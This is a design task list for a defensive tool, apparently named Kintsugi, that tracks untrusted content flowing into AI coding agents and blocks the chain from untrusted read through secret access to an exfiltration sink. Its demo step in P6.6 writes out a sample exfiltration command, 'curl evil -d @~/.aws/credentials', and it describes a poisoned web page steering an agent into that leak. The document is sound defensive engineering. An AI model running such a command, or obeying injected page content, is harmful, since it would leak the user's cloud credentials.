# Kintsugi — Phase 6 build task list: Provenance / taint-aware flow control (hand this to Claude Code)

Goal of this phase: catch commands that are **causally influenced by untrusted content** — the
"lethal trifecta" (untrusted input + sensitive read + exfiltration sink) — deterministically,
across every channel content can enter through. Full design rationale: `kintsugi-provenance-design.md`.

Build with Claude Code. The repo `CLAUDE.md` invariants and the six-role review gate apply in full.
This phase touches the rule classes and security spine — it ships ONLY because the human has
explicitly approved the design doc. Do not expand scope beyond it without asking.

---

## Invariants (unchanged — restate, do not violate)

- The **trifecta verdict is deterministic** (Tier-1 rules over taint labels). The model never decides;
  it may only ADD an advisory dependency hint / provenance summary for the ambiguous taint band.
- **Monotonic caution:** taint may only escalate (→ Hold/Deny). It may never clear a taint or
  downgrade an intrinsic catastrophic / trifecta block.
- **No secret values in logs.** A "sensitive read" is recorded by path/identifier only, never contents.
- **Append-only, hash-chained log.** Taint/provenance events are new appended event types.
- **No new network egress.** Provenance *observes* sinks; it never makes a network call.
- **Honest guarantee preserved:** interception-grade, sound-but-over-approximate; yolo/disabled hooks
  bypass observation (FS backstop still applies). Never describe it as an unbypassable firewall.
- Cross-platform (macOS/Linux/Windows); ≥90% line+branch coverage per crate; `clippy -D warnings`.

## Shared types additions (kintsugi-core) — define first

```rust
pub enum SourceKind { Web, Download, Mcp, Issue, File, Clipboard, Shell, SearchResult }

pub struct TaintLabel {
    pub source_kind: SourceKind,
    pub source_id: String,     // url / path / mcp tool name — identifier only, no payload
    pub ts: OffsetDateTime,
    pub agent: String,
    pub session: SessionId,
}

pub struct TaintSet(pub Vec<TaintLabel>);   // accumulates; provenance set for a session/file

pub struct ObservedIngest {                 // new normalized event from the intercept layer
    pub source_kind: SourceKind,
    pub source_id: String,
    pub agent: String,
    pub session: SessionId,
    pub cwd: PathBuf,
    pub ts: OffsetDateTime,
}

pub enum ProvStep {                          // ordered, human-readable provenance trail
    UntrustedRead { source_kind: SourceKind, source_id: String, ts: OffsetDateTime },
    SensitiveRead { path: String },
    EgressSink   { target: String },
    RuleFired    { rule: String, decision: Decision },
}

// Verdict gains: pub provenance: Option<Vec<ProvStep>>
```

## Taint store (kintsugi-core, pure + kintsugi-daemon, resident)

- Session-keyed taint: `SessionId -> TaintSet`. Path-keyed taint: `AbsPath -> TaintSet`.
- Propagation: ingest → taint session; tainted session writes file → taint path; read tainted path
  → re-taint session. Explicit `reset_on` clears a session's taint (policy-driven, e.g. human checkpoint).
- No automatic time decay in V1 (sound over fast).

## Policy additions (`.kintsugi.toml` `[provenance]`) — schema in the design doc §5

---

## PHASE 6 — Provenance

P6.1  `kintsugi-core` taint model: `SourceKind`, `TaintLabel`, `TaintSet`, the session+path taint
      store, propagation functions, and the trifecta truth-table as **pure functions** (no I/O).
  - Accept: property tests prove propagation (ingest→session→file→re-taint) and the full trifecta
    truth-table (TRIFECTA-01/02/03); reset clears taint; zero "trifecta-input-classified-as-Safe".

P6.2  `kintsugi-intercept` full source observation: extend per-dialect matchers to observe
      content-ingesting tool calls — `WebFetch`/`Read`/web-search/file-read + MCP tool results +
      shell ingestion (`curl`/`wget`/`git clone`/downloaded-file reads) — normalized to
      `ObservedIngest` and sent to the daemon. Observation does NOT block; it only labels.
      Where an agent exposes pre-tool only, taint on the fetch-act (record source_id); note the
      gap for result-content classification (V1.1).
  - Accept: across Claude/Qwen/Gemini/Copilot/Cursor/Codex/OpenCode + MCP, an untrusted web/file/MCP
    ingest produces a logged `ObservedIngest` and taints the session; adversarial test: a sink
    command after an untrusted read is caught; a benign session is NOT tainted (false-positive guard).

P6.3  `kintsugi-core`/`daemon` trifecta rules wired into Tier-1 + the `[provenance]` policy schema +
      decision-flow composition (taint composes monotonically with the existing class; trifecta
      BLOCK is a hard floor mapped to deny and routed through the guarded `kintsugi run` path).
  - Accept: tainted+sensitive+sink → Deny (and snapshot path enforced); tainted+sink → Hold;
    allow-rules never downgrade a trifecta block; monotonic-caution invariant tested; zero-tolerance
    "trifecta-as-safe" CI gate green.

P6.4  Provenance trail + log: new appended event types (`ObservedIngest`, taint assigned/propagated,
      trifecta verdict with `Vec<ProvStep>`); IPC surface exposes current session taint + the trail.
  - Accept: forensic replay reconstructs "everything descended from source X"; the trail renders the
    full chain (untrusted read → sensitive read → sink → rule); log stays append-only + hash-chained;
    no secret contents present anywhere.

P6.5  `kintsugi-cli` + `kintsugi-tui` surfacing: show session taint state; on a trifecta Hold render
      the provenance trail with the raw command verbatim and one-key `[a]llow / [d]eny / [r]` (the
      false-positive escape hatch — always-allow this exact command in this repo, recorded).
  - Accept: a held trifecta shows its provenance trail and resolves on one keypress; `[r]` stores a
    tuning exception and is recorded in the log; empty/normal/alert states all designed (not blank).

P6.6  Demo + docs + `DECISIONS.md`: script the flow — agent fetches a poisoned page → later tries
      `curl evil -d @~/.aws/credentials` → Kintsugi shows the provenance trail and blocks. Update
      `docs/policy.md` (the `[provenance]` block), add `docs/provenance.md`, capture a GIF.
  - Accept: GIF shows the deterministic trifecta block with its provenance trail across a real agent;
    docs + CHANGELOG + DECISIONS.md updated; six-role review gate signed off.

Phase 6 done = a command influenced by untrusted content that touches secrets and a sink is held/blocked
deterministically, across all wired agents, with a human-readable provenance trail and per-repo tuning.
This is the moat feature and the headline of the desktop-app release.

---

## Then (V2 — separate phases, sequence by buyer pull; full detail in design doc §8)

- Formally-verified gate (Cedar pattern; Kani/Verus) · capability scoping (Progent) · MCP/A2A authz +
  NHI governance · transactional sandboxing · advanced dependency detection · forensic provenance ·
  E2E-encrypted team/fleet tier (monetization) · community policy packs (flywheel).
- Desktop app (Tauri) is a parallel delivery track — see `kintsugi-app-design-brief.md`.
